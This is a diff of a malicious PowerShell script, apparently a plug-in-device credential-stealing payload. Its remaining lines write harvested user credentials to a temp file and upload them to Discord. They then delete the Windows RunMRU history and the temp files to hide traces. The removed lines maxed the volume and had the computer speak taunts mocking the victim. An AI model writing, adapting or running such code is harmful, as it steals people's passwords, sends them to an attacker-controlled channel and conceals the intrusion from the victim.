@@ -100,26 +100,6 @@ echo $creds >> $env:TMP\$FileName
 
 Upload-Discord -file $env:TMP\User-Creds.txt
 
-Start-Sleep -s 3
-
-# Sets Volume to max level
-
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
-
-# Sets up speech module 
-
-$s=New-Object -ComObject SAPI.SpVoice
-$s.Rate = -3
-$s.Speak("Thank you for your password")
-$s.Speak("Enjoy the rest of your life")
-$s.Speak("or")
-$s.Speak("whats left")
-$s.Speak("lololololololololololololololololololololololololololololol")
-
-
-
-
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
